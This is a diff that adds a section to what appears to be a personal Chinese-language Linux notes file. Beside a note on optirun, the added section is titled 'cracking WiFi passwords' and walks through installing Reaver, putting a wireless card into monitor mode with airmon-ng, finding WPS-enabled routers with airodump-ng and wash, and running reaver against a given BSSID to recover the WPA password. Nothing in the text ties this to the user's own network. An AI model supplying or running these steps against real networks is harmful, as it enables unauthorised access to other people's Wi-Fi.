@@ -228,4 +228,20 @@ tty1~6不支持中文显示：
   调用N卡工作
     命令“optirun xxx"可用来调用N卡运作处理程序xxx（程序名）的图形计算 ，不过图形渲染仍由I卡负责
     
+破解WiFi密码
+  安装Reaver
+    apt-get update
+    apt-get install reaver
+  监听本地WIFI信号
+    ifconfig
+  将无线网卡设置为监控模式：假设你的无线网卡接口名称为wlx001d0f04f093，执行下列命令，将无线网卡设置为监控模式 : 
+    sudo airmon-ng start wlx001d0f04f093
+  再执行：sudo airodump-ng mon0， 获取附近的WIFI信号：
+  
+  我们使用wash这个命令， 可以查看到附近有开WPS功能的路由器， 在控制台输入一下代码， mon0为混杂模式的网卡端口， 查看结果如下图：
+    sudo wash -i mon0
     
+  使用Reaver破解无线网络的WPA密码
+    在终端中执行下列命令，用你实际获取到的BSSID替换命令中的bssid：  reaver -i moninterface -b bssid -vv :
+      sudo reaver -i mon0 -b 5C:63:BF:C4:A4:CE -vv 
+  
